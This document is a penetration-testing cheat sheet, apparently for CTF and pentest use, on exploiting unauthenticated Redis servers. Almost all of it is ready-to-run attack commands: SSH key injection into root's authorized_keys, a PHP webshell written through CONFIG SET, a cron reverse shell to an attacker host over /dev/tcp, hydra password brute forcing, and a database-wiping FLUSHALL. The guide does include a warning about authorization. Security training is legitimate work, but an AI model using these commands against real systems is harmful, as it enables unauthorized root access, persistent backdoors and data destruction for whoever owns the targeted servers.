# Redis (6379)

!!! tip "Start here"
    Connect without credentials: `redis-cli -h $IP`. Run `INFO`, if it responds, you have unauthenticated access. Check if you can write to disk with `CONFIG SET dir` and `CONFIG SET dbfilename`, this is the path to SSH key injection or webshell drops.

---

## Enumeration

```bash
nmap -p 6379 --script redis-info $IP
redis-cli -h $IP
```

---

## Basic Interaction

```bash
redis-cli -h $IP
redis-cli -h $IP -a <password>

# Once connected:
INFO                    # server info, OS, config file location
CONFIG GET *            # dump full configuration
KEYS *                  # list all keys
GET <key>               # read a key value
```

---

## SSH Key Injection

If Redis can write files and SSH is running:

!!! warning "Watch out"
    `FLUSHALL` wipes the entire Redis database. Fine on a CTF box, on a real engagement, this is a service-disrupting action. Document the operation, get explicit authorization first, and if possible snapshot the keyspace with `SAVE` and copy the RDB file before flushing. Consider using a unique key name without `FLUSHALL` unless the target key must start at offset zero.

```bash
# Generate a key pair
ssh-keygen -t rsa -f /tmp/redis_key

# Write the public key into Redis
echo -e "\n\n" >> /tmp/redis_key.pub
redis-cli -h $IP FLUSHALL
cat /tmp/redis_key.pub | redis-cli -h $IP -x SET pwn

# Set the write path to root's .ssh directory
redis-cli -h $IP CONFIG SET dir /root/.ssh
redis-cli -h $IP CONFIG SET dbfilename authorized_keys
redis-cli -h $IP BGSAVE

# Connect
ssh -i /tmp/redis_key root@$IP
```

---

## Web Shell via File Write

If a web server is running and you can identify the web root from `INFO`:

```bash
redis-cli -h $IP CONFIG SET dir /var/www/html
redis-cli -h $IP CONFIG SET dbfilename shell.php
redis-cli -h $IP SET payload '<?php system($_GET["cmd"]); ?>'
redis-cli -h $IP BGSAVE
```

---

## Cron Job for Reverse Shell

```bash
redis-cli -h $IP CONFIG SET dir /var/spool/cron/crontabs
redis-cli -h $IP CONFIG SET dbfilename root
redis-cli -h $IP SET cron "\n\n* * * * * bash -i >& /dev/tcp/$LHOST/9001 0>&1\n\n"
redis-cli -h $IP BGSAVE
```

---

## Brute Force (if password protected)

```bash
hydra -P /usr/share/wordlists/rockyou.txt redis://$IP
```

!!! tip "Real-world"
    Redis without a password is still extremely common, it was designed as an in-memory cache on trusted internal networks, and auth was an afterthought. The SSH key injection technique works reliably when Redis runs as root (common on misconfigured servers). Even when it's not root, the web shell or cron path is often viable. Always check what user Redis is running as with `INFO server` before choosing an attack path.
